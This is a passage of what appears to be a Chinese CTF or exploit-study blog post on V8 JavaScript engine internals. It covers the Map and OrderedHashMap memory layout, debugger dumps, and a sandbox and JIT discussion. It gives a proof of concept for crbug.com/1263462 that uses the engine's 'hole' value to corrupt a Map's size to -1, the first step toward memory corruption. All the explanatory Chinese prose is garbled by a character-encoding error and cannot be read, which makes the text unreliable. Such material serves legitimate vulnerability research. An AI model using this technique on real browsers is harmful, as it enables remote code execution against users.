<li><code>Map</code> Â∞ÜÊèê‰æõÂ±ûÊÄßÂÄºÂú®Áõ∏Â∫îÂå∫Âüü‰∏≠ÁöÑÁ°ÆÂàá‰ΩçÁΩÆ</li>
</ul>
<p>Êú¨Ë¥®‰∏äÔºåÊò†Â∞ÑÂÆö‰πâ‰∫ÜÂ∫îÂ¶Ç‰ΩïËÆøÈóÆÂØπË±°Ôºö</p>
<ul>
<li>ÂØπ‰∫éÂØπË±°Êï∞ÁªÑÔºöÂ≠òÂÇ®ÁöÑÊòØÊØè‰∏™ÂØπË±°ÁöÑÂú∞ÂùÄ</li>
<li>ÂØπ‰∫éÊµÆÁÇπÊï∞ÁªÑÔºö‰ª•ÊµÆÁÇπÊï∞ÂΩ¢ÂºèÂ≠òÂÇ®Êï∞ÂÄº</li>
</ul>
<p>Â¶ÇÊûúÊàë‰ª¨ÂèØ‰ª•‰øÆÊîπ <code>Map</code> ‰∏≠Êüê‰∫õÂèòÈáèÁöÑÊï∞ÊçÆÁ±ªÂûãÔºåÂ∞±ÂèØ‰ª•ËææÂà∞Á±ªÂûãÊ∑∑Ê∑ÜÁöÑÊïàÊûú</p>
<p><strong>JavaScript Map ÂØπË±°ÂéüÁêÜ</strong></p>
<p>ÂÖàÈöè‰æøÊâìÂç∞‰∏Ä‰∏™ <code>Map</code> ÁöÑÂÜÖÂ≠ò‰ø°ÊÅØÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(m)</span><br><span class="line">DebugPrint: <span class="number">0x21100004b9d1</span>: [JSMap]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x2110001862f1</span> &lt;Map[<span class="number">16</span>](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x211000186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x211000186319</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x211000002259</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - table: <span class="number">0x21100004b9e1</span> &lt;OrderedHashMap[<span class="number">17</span>]&gt;</span><br><span class="line"> - properties: <span class="number">0x211000002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"><span class="number">0x2110001862f1</span>: [Map] in OldSpace</span><br><span class="line"> - type: JS_MAP_TYPE</span><br><span class="line"> - instance size: <span class="number">16</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - <span class="keyword">enum</span> length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: <span class="number">0x2110000023e1</span> &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x2110001443cd</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">0</span>: <span class="number">0x2110000021ed</span> &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;</span><br><span class="line"> - prototype: <span class="number">0x211000186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x211000186319</span>&gt;</span><br><span class="line"> - constructor: <span class="number">0x2110001862bd</span> &lt;JSFunction Map (sfi = <span class="number">0x2110001557b9</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x2110000021e1</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">[object Map]</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂíåÂØπË±° JS_OBJECT_TYPE Áõ∏ÊØîÔºåJSMap Â§ö‰∫Ü‰∏Ä‰∏™ <code>table</code> Â±ûÊÄßÔºåËøô‰∏™Â±ûÊÄßÊòØ‰∏Ä‰∏™ OrderedHashMap È°∫Â∫èÂìàÂ∏åË°®</li>
</ul>
<p><code>Map</code> ÊòØÂü∫‰∫éÂìàÂ∏åË°®ÂÆûÁé∞ÁöÑÔºå‰ΩÜÂìàÂ∏åË°®‰∏çÊèê‰æõ‰ªª‰ΩïËø≠‰ª£È°∫Â∫è‰øùËØÅÔºåËÄå ES6 ËßÑËåÉË¶ÅÊ±ÇÂÆûÁé∞Âú®Ëø≠‰ª£ <code>Map</code> Êó∂‰øùÊåÅÊèíÂÖ•È°∫Â∫èÔºåÂõ†Ê≠§Ôºå‚ÄúÁªèÂÖ∏‚ÄùÁÆóÊ≥ï‰∏çÈÄÇÂêà <code>Map</code></p>
<p>V8 ‰ΩøÁî®‰∫ÜÁ°ÆÂÆöÊÄßÂìàÂ∏åË°®ÁÆóÊ≥ïÔºàÈ°∫Â∫èÂìàÂ∏åË°®ÔºâÔºå‰ª•‰∏ãÊòæÁ§∫‰∫ÜÊ≠§ÁÆóÊ≥ï‰ΩøÁî®ÁöÑ‰∏ªË¶ÅÊï∞ÊçÆÁªìÊûÑÔºö</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Entry</span> </span>&#123; <span class="comment">/* buckets */</span></span><br><span class="line">    key: any;</span><br><span class="line">    value: any;</span><br><span class="line">    chain: number;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">CloseTable</span> </span>&#123; <span class="comment">/* table */</span></span><br><span class="line">    hashTable: number[];</span><br><span class="line">    dataTable: Entry[];</span><br><span class="line">    nextSlot: number;</span><br><span class="line">    size: number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>CloseTable Êé•Âè£‰ª£Ë°®‰∫ÜÂìàÂ∏åË°®ÔºåÂåÖÂê´Ôºö<ul>
<li>hashTableÔºöÂìàÂ∏åË°®Êï∞ÁªÑÔºàÂ§ßÂ∞èÁ≠â‰∫é‚ÄúÂ≠òÂÇ®Ê°∂‚ÄùÁöÑÊï∞ÈáèÔºâ</li>
<li>dataTableÔºöÂåÖÂê´ÊåâÊèíÂÖ•È°∫Â∫èÊéíÂàóÁöÑÊù°ÁõÆ</li>
</ul>
</li>
<li>Entry Êé•Âè£‰ª£Ë°®‚ÄúÂ≠òÂÇ®Ê°∂‚Äù<ul>
<li>key/valueÔºöÈîÆÂÄºÂØπ</li>
<li>chainÔºöÈìæÂ±ûÊÄßÔºàÊåáÂêëÂ≠òÂÇ® Entry ÁöÑ‰∏ã‰∏Ä‰∏™Êù°ÁõÆÔºâ</li>
<li>nextSlotÔºöÁî®‰∫éÁ¥¢ÂºïÂà∞ dataTable ‰∏≠</li>
</ul>
</li>
</ul>
<p>ÂÖ∑‰ΩìÁöÑÊìç‰ΩúÂ¶Ç‰∏ãÔºö</p>
<ul>
<li>ÊØèÊ¨°Â∞ÜÊñ∞Êù°ÁõÆÊèíÂÖ•Ë°®‰∏≠Êó∂ÔºåÂÆÉÈÉΩ‰ºöÂ≠òÂÇ®Âú® nextSlot Á¥¢Âºï‰∏ãÁöÑ dataTable Êï∞ÁªÑ‰∏≠ÔºàÊèíÂÖ•ÁöÑÊù°ÁõÆÂ∞ÜÊàê‰∏∫Êñ∞ÁöÑÂ∞æÈÉ®Ôºâ</li>
<li>ÂΩì‰∏Ä‰∏™Êù°ÁõÆ‰ªéÂìàÂ∏åË°® hashTable ‰∏≠Âà†Èô§Êó∂ÔºåÂÆÉ‰πü‰ºö‰ªéÊï∞ÊçÆË°® dataTable ‰∏≠Âà†Èô§Ôºå‰ΩÜÂ∑≤Âà†Èô§ÁöÑÊù°ÁõÆ‰ªç‰ºöÂç†Áî®Êï∞ÊçÆË°®‰∏≠ÁöÑÁ©∫Èó¥ÔºàÁî® hole ËøõË°åÂ°´ÂÖÖÔºâ</li>
<li>ÂΩì‰∏Ä‰∏™Ë°®ÂÖÖÊª°‰∫ÜÊù°ÁõÆÔºàÂåÖÊã¨Â≠òÂú®ÁöÑÂíåÂ∑≤Âà†Èô§ÁöÑÔºâÊó∂ÔºåÈúÄË¶ÅÁî®Êõ¥Â§ßÔºàÊàñÊõ¥Â∞èÔºâÁöÑÂ§ßÂ∞èÈáçÊñ∞Êï£ÂàóÔºàÈáçÂª∫Ôºâ</li>
</ul>
<p>‰ΩøÁî®ËøôÁßçÊñπÊ≥ïÔºåÂØπ <code>Map</code> ËøõË°åËø≠‰ª£Âè™ÈúÄÈÅçÂéÜÊï∞ÊçÆË°®Âç≥ÂèØÔºåËøô‰øùËØÅ‰∫ÜËø≠‰ª£ÁöÑÊèíÂÖ•È°∫Â∫èË¶ÅÊ±Ç</p>
<p>ÊµãËØïÊ°à‰æãÔºö</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">map.set(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">map.set(<span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">map.delete(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂÖàÊâßË°å‰∏§‰∏™ <code>set</code>Ôºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span>.<span class="built_in">set</span>(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="built_in">map</span>.<span class="built_in">set</span>(<span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">---------------------------------------</span><br><span class="line">pwndbg&gt; job <span class="number">0x1d830004b9d9</span></span><br><span class="line"><span class="number">0x1d830004b9d9</span>: [OrderedHashMap]</span><br><span class="line"> - FixedArray length: <span class="number">17</span></span><br><span class="line"> - elements: <span class="number">2</span> <span class="comment">/* ÂÖÉÁ¥†‰∏™Êï∞ */</span></span><br><span class="line"> - deleted: <span class="number">0</span> <span class="comment">/* Âà†Èô§‰∏™Êï∞ */</span></span><br><span class="line"> - buckets: <span class="number">2</span> <span class="comment">/* Â∑≤‰ΩøÁî®ÁöÑÂ≠òÂÇ®Ê°∂‰∏™Êï∞ */</span></span><br><span class="line"> - capacity: <span class="number">4</span> <span class="comment">/* mapÂÆπÈáè(capacity/2Â∞±ÊòØÂΩìÂâçÂèØ‰ª•ÂÆπÁ∫≥ÁöÑÊúÄÂ§ßbucketÊï∞ÁõÆ) */</span></span><br><span class="line"> - buckets: &#123; <span class="comment">/* Â≠òÂÇ®Ê°∂ */</span></span><br><span class="line">              <span class="number">0</span>: <span class="number">0</span></span><br><span class="line">              <span class="number">1</span>: <span class="number">1</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: &#123; <span class="comment">/* ÂÖÉÁ¥† */</span></span><br><span class="line">              <span class="number">0</span>: <span class="number">1</span> -&gt; <span class="number">0x1d830000407d</span> &lt;String[<span class="number">1</span>]: <span class="meta">#a&gt;</span></span><br><span class="line">              <span class="number">1</span>: <span class="number">2</span> -&gt; <span class="number">0x1d830000408d</span> &lt;String[<span class="number">1</span>]: <span class="meta">#b&gt;</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÁÑ∂ÂêéÊâßË°å‰∏Ä‰∏™ <code>delete</code>Ôºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span>.<span class="keyword">delete</span>(<span class="number">1</span>);</span><br><span class="line">---------------------------------------</span><br><span class="line">pwndbg&gt; job <span class="number">0x1d830004b9d9</span></span><br><span class="line"><span class="number">0x1d830004b9d9</span>: [OrderedHashMap]</span><br><span class="line"> - FixedArray length: <span class="number">17</span></span><br><span class="line"> - elements: <span class="number">1</span></span><br><span class="line"> - deleted: <span class="number">1</span></span><br><span class="line"> - buckets: <span class="number">2</span></span><br><span class="line"> - capacity: <span class="number">4</span> </span><br><span class="line"> - buckets: &#123;  <span class="comment">/* Â≠òÂÇ®Ê°∂‰∏çÂáèÂ∞ë */</span></span><br><span class="line">              <span class="number">0</span>: <span class="number">0</span></span><br><span class="line">              <span class="number">1</span>: <span class="number">1</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: &#123; <span class="comment">/* ÂÖÉÁ¥†ÂáèÂ∞ë */</span></span><br><span class="line">              <span class="number">1</span>: <span class="number">2</span> -&gt; <span class="number">0x1d830000408d</span> &lt;String[<span class="number">1</span>]: <span class="meta">#b&gt;</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂØπË±° JSMap ÁöÑËØ¶ÁªÜ‰ø°ÊÅØÂ¶Ç‰∏ãÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(<span class="built_in">map</span>);  </span><br><span class="line">DebugPrint: <span class="number">0x1d830004b9c9</span>: [JSMap]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x1d83001862f1</span> &lt;Map[<span class="number">16</span>](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x1d8300186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x1d8300186319</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x1d8300002259</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - table: <span class="number">0x1d830004b9d9</span> &lt;OrderedHashMap[<span class="number">17</span>]&gt;</span><br><span class="line"> - properties: <span class="number">0x1d8300002259</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;&#125;</span><br><span class="line"><span class="number">0x1d83001862f1</span>: [Map] in OldSpace</span><br><span class="line"> - type: JS_MAP_TYPE</span><br><span class="line"> - instance size: <span class="number">16</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - <span class="keyword">enum</span> length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: <span class="number">0x1d83000023e1</span> &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x1d83001443cd</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">0</span>: <span class="number">0x1d83000021ed</span> &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;</span><br><span class="line"> - prototype: <span class="number">0x1d8300186431</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x1d8300186319</span>&gt;</span><br><span class="line"> - constructor: <span class="number">0x1d83001862bd</span> &lt;JSFunction Map (sfi = <span class="number">0x1d83001557b9</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x1d83000021e1</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">[object Map]</span><br></pre></td></tr></table></figure>
<ul>
<li>ÊâìÂç∞ <code>table</code> Â±ûÊÄßÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xw <span class="number">0x1d830004b9d9</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x1d830004b9d8</span>:	<span class="number">0x00002c29</span>	<span class="number">0x00000022</span>	<span class="number">0x00000002</span>	<span class="number">0x00000002</span></span><br><span class="line"><span class="number">0x1d830004b9e8</span>:	<span class="number">0x00000004</span>	<span class="number">0x00000000</span>	<span class="number">0x00000002</span>	<span class="number">0x00002459</span></span><br><span class="line"><span class="number">0x1d830004b9f8</span>:	<span class="number">0x00002459</span>	<span class="number">0xfffffffe</span>	<span class="number">0x00000004</span>	<span class="number">0x0000408d</span></span><br><span class="line"><span class="number">0x1d830004ba08</span>:	<span class="number">0xfffffffe</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span></span><br><span class="line"><span class="number">0x1d830004ba18</span>:	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000023e1</span>	<span class="number">0x000025d5</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x00002459</span>+<span class="number">0x1d8300000000</span></span><br><span class="line"><span class="number">0x1d8300002459</span>: [Oddball] in ReadOnlySpace: <span class="meta">#hole</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x000023e1</span>+<span class="number">0x1d8300000000</span></span><br><span class="line"><span class="number">0x1d83000023e1</span>: [Oddball] in ReadOnlySpace: <span class="meta">#undefined</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Êï¥Êï∞Âú® V8 ‰∏≠Ë°®Á§∫‰∏∫Ââç31‰ΩçÔºåÊúÄÂêé‰∏Ä‰Ωç‰∏ç‰ΩøÁî®ÔºàËøôÂ∞±ÊòØ‚Äú0x1‚ÄùË°®Á§∫‰∏∫‚Äú0x2‚ÄùÔºå‚Äú0xfffffffe‚ÄùË°®Á§∫‚Äú-1‚ÄùÁöÑÂéüÂõ†Ôºâ</li>
<li>hole Âú®Êú¨Á®ãÂ∫è‰∏≠Áî® <code>0x00002459</code> Ë°®Á§∫</li>
<li>undefined Âú®Êú¨Á®ãÂ∫è‰∏≠Áî® <code>0x000023e1</code> Ë°®Á§∫</li>
</ul>
<p>ËÆ∞ÂΩï OrderedHashMap ÁöÑ‰∏Ä‰∫õÈáçË¶ÅÂÖÉÊï∞ÊçÆÁöÑÁ≤óÁï•Â∏ÉÂ±ÄÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">table + <span class="number">0x10</span> =&gt; Map capacity (<span class="number">0x4</span>) </span><br><span class="line">table + <span class="number">0x14</span> =&gt; Bucket<span class="number">-0</span> data <span class="comment">/* 0 */</span></span><br><span class="line">table + <span class="number">0x18</span> =&gt; Bucket<span class="number">-1</span> data <span class="comment">/* 1 */</span></span><br><span class="line">table + <span class="number">0x1c</span> =&gt; Entry<span class="number">-0</span> key (<span class="number">0x00002459</span>) <span class="comment">/* #hole */</span></span><br><span class="line">table + <span class="number">0x20</span> =&gt; Entry<span class="number">-0</span> value (<span class="number">0x00002459</span>) <span class="comment">/* #hole */</span></span><br><span class="line">table + <span class="number">0x24</span> =&gt; Entry<span class="number">-0</span> next_ptr</span><br><span class="line">table + <span class="number">0x28</span> =&gt; Entry<span class="number">-1</span> key (<span class="number">0x00000004</span>) <span class="comment">/* 2 */</span></span><br><span class="line">table + <span class="number">0x2c</span> =&gt; Entry<span class="number">-1</span> value (<span class="number">0x0000408d</span>) <span class="comment">/* #b */</span></span><br><span class="line">table + <span class="number">0x30</span> =&gt; Entry<span class="number">-1</span> next_ptr</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂÖàÈ¢ÑÁïô <code>0x4 * capacity/2</code> ÁöÑÁ©∫Èó¥Áî®‰∫éÂ°´ÂÖÖ Bucket dataÔºàÂ≠òÂÇ®Ê°∂Êï∞ÊçÆÔºâ</li>
<li>‰πãÂêéÁöÑÁ©∫Èó¥‰ºö‰ª• <code>0x4 * 3</code> ‰∏∫Âçï‰ΩçÊù•ÂÇ®Â≠òÂêÑ‰∏™ <code>Entry</code> ‰ø°ÊÅØ</li>
<li>Ë¢´ <code>delete</code> ÊñπÊ≥ïÂà†Èô§ÁöÑÂå∫ÂüüÈúÄË¶ÅÁî® hole Â°´ÂÖÖ</li>
<li>ËÄå‰πãÂêéÁöÑÁ©∫Èó¥ÂàôË¢´ undefined Â°´ÂÖÖ</li>
</ul>
<p><strong>JavaScript SandBox &amp; JIT</strong></p>
<p>ÂØπ‰∫é JavaScript Êù•ËØ¥ÔºåÊ≤ôÁÆ±Âπ∂Èùû‰º†ÁªüÊÑè‰πâ‰∏äÁöÑÊ≤ôÁÆ±ÔºåÂÆÉÂè™ÊòØ‰∏ÄÁßçËØ≠Ê≥ï‰∏äÁöÑ Hack ÂÜôÊ≥ïÔºåÊ≤ôÁÆ±ÊòØ‰∏ÄÁßçÂÆâÂÖ®Êú∫Âà∂ÔºåÊää‰∏Ä‰∫õ‰∏ç‰ø°‰ªªÁöÑ‰ª£Á†ÅËøêË°åÂú®Ê≤ôÁÆ±‰πãÂÜÖÔºå‰ΩøÂÖ∂‰∏çËÉΩËÆøÈóÆÊ≤ôÁÆ±‰πãÂ§ñÁöÑ‰ª£Á†Å </p>
<p>ÂΩìÈúÄË¶ÅËß£ÊûêÊàñËÄÖÊâßË°å‰∏çÂèØ‰ø°ÁöÑ JavaScript ‰ª£Á†ÅÊó∂ÔºåÈúÄË¶ÅÈöîÁ¶ªË¢´ÊâßË°å‰ª£Á†ÅÁöÑÊâßË°åÁéØÂ¢ÉÔºåÂπ∂ÂØπÊâßË°å‰ª£Á†Å‰∏≠ÂèØËÆøÈóÆÂØπË±°ËøõË°åÈôêÂà∂ÔºåÈÄöÂ∏∏ÂºÄÂßãÂèØ‰ª•Êää JavaScript ‰∏≠Â§ÑÁêÜÊ®°Âùó‰æùËµñÂÖ≥Á≥ªÁöÑÈó≠ÂåÖÁß∞‰πã‰∏∫Ê≤ôÁÆ±</p>
<p>Êàë‰ª¨Â§ßËá¥ÂèØ‰ª•ÊääÊ≤ôÁÆ±ÁöÑÂÆûÁé∞ÊÄª‰ΩìÂàÜ‰∏∫‰∏§‰∏™ÈÉ®ÂàÜÔºö</p>
<ul>
<li>ÊûÑÂª∫‰∏Ä‰∏™Èó≠ÂåÖÁéØÂ¢É</li>
<li>Ê®°ÊãüÂéüÁîüÊµèËßàÂô®ÂØπË±°</li>
</ul>
<p>‰∏Ä‰∏™ÈáçË¶ÅÁöÑ‰øùÊä§ÊòØÔºåÂÆÉÂ∞ÜÊâÄÊúâÂ§ñÈÉ®ÊåáÈíàËΩ¨Êç¢‰∏∫Êü•ÊâæË°®ÁöÑÁ¥¢ÂºïÔºå‰æãÂ¶ÇÊåáÂêë Web Á®ãÂ∫èÈõÜ RWX È°µÁöÑÊåáÈíàÂíå ArrayBuffer ÂêéÂ§áÂ≠òÂÇ®ÁöÑÊåáÈíàÔºåÂõ†Ê≠§ÔºåÊàë‰ª¨‰∏çËÉΩ‰ΩøÁî®ÊôÆÈÄöÊñπÊ≥ïÊù•ÂÆûÁé∞‰ªªÊÑèËØªÂÜô</p>
<p>ËÄå JavaScript JITÔºàJust-In-TimeÔºâÂàôÊòØÂè¶‰∏ÄÁßçÊú∫Âà∂Ôºö</p>
<p>JIT compiler Ê∑∑Âêà‰∫ÜÁºñËØëÂô®ÂíåËß£ÈáäÂô®ÁöÑ‰ºòÁÇπÔºåÂ§ßÂπÖÊèêÈ´ò‰∫Ü JavaScript ÁöÑËøêË°åÈÄüÂ∫¶Ôºö</p>
<ul>
<li>‰∏ÄÂºÄÂßãÂè™ÊòØÁÆÄÂçïÁöÑ‰ΩøÁî®Ëß£ÈáäÂô®ÊâßË°åÔºåÂΩìÊüê‰∏ÄË°å‰ª£Á†ÅË¢´ÊâßË°å‰∫ÜÂá†Ê¨°ÔºåËøôË°å‰ª£Á†Å‰ºöË¢´Êâì‰∏ä Warm ÁöÑÊ†áÁ≠æÔºåÂΩìÊüê‰∏ÄË°å‰ª£Á†ÅË¢´ÊâßË°å‰∫ÜÂæàÂ§öÊ¨°ÔºåËøôË°å‰ª£Á†Å‰ºöË¢´Êâì‰∏ä Hot ÁöÑÊ†áÁ≠æ </li>
<li>Ë¢´Êâì‰∏ä Warm Ê†áÁ≠æÁöÑ‰ª£Á†Å‰ºöË¢´‰º†Áªô Baseline Compiler ÁºñËØë‰∏îÂÇ®Â≠òÔºåÂêåÊó∂ÊåâÁÖßË°åÊï∞ÂíåÂèòÈáèÁ±ªÂûãË¢´Á¥¢Âºï</li>
<li>Ë¢´Êâì‰∏ä Hot Ê†áÁ≠æÁöÑ‰ª£Á†Å‰ºöË¢´‰º†Áªô Optimizing compilerÔºåËøôÈáå‰ºöÂØπËøôÈÉ®ÂàÜÂ∏¶Á†ÅÂÅöÊõ¥‰ºòÂåñÁöÑÁºñËØë </li>
<li>ÂΩìÂèëÁé∞ÊâßË°åÁöÑ‰ª£Á†ÅÂëΩ‰∏≠Á¥¢ÂºïÔºå‰ºöÁõ¥Êé•ÂèñÂá∫ÁºñËØëÂêéÁöÑ‰ª£Á†ÅÊâßË°åÔºå‰ªéËÄå‰∏çÈúÄË¶ÅÈáçÂ§çÁºñËØëÂ∑≤ÁªèÁºñËØëËøáÁöÑ‰ª£Á†Å</li>
</ul>
<p>Âà©Áî® JIT Êú∫Âà∂Â∞±ÂèØ‰ª•ÁªïËøá SandBox</p>
<p><strong>Â≠¶‰π†Áõ∏ÂÖ≥ POC</strong></p>
<p>Âú® path ‰∏≠ÁªôÂá∫‰∫Ü‰∏ÄÁØáÊñáÁ´† <code>crbug.com/1263462</code> ÂÖàÂ≠¶‰π†ÂÆÉ</p>
<p>ËøôÁØáÊñáÁ´†Â§ßÊ¶ÇËÆ≤Ëø∞‰∫Ü V8 ÂØπ TheHole ÁöÑÁâπÊÆäÂ§ÑÁêÜÔºàÂÖ∑‰ΩìÊÄé‰πàÂ§ÑÁêÜÁöÑÊöÇÊó∂‰∏çÊ∏ÖÊ•öÔºâÔºåÂà©Áî®Ëøô‰∏™ÁâπÊÄßÔºåÂèØ‰ª•ÂØπ <code>Map</code> ËøõË°åÁ†¥Âùè</p>
<p>POC Â¶Ç‰∏ãÔºö</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"><span class="comment">/* Áî±‰∫éÂØπÂ≠îÂÄºÁöÑÁâπÊÆäÂ§ÑÁêÜ,ËøôÊúÄÁªàÂ∞Ü Map ÁöÑÂ§ßÂ∞èËÆæÁΩÆ‰∏∫&quot;-1&quot; */</span></span><br><span class="line">map.set(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.set(hole, <span class="number">1</span>);</span><br><span class="line">map.delete(hole);</span><br><span class="line">map.delete(hole);</span><br><span class="line">map.delete(<span class="number">1</span>);</span><br><span class="line"><span class="comment">/* print(map.size); Size is now -1 */</span></span><br></pre></td></tr></table></figure>
<p>ÂÖàÊü•ÁúãËøô‰∏™ hole ÂíåÈ¢òÁõÆ‰∏≠ÁöÑ hole ÊñπÊ≥ïÊúâ‰ªÄ‰πàÂÖ≥Á≥ªÔºö</p>
